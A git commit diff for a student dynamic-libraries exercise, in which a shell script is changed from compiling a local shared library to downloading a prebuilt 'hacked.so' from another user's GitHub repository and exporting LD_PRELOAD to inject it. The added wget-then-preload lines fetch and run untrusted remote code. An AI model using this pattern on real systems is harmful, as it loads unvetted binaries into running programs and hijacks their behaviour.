d0537f12b99c2942531fc4cd6841afd83e86e3f7
Timothy Oladapo <90522458+Polham50@users.noreply.github.com>
2022-12-16 00:12:04 +0100

    Update 101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-gcc *.o -fPIC -shared -o libruin.so
-LD_PRELOAD=$WPD/libruin.so
+wget -P /tmp https://github.com/NwabuezeFranklin/alx-low_level_programming/raw/main/0x18-dynamic_libraries/hacked.so
+export LD_PRELOAD=/tmp/hacked.so
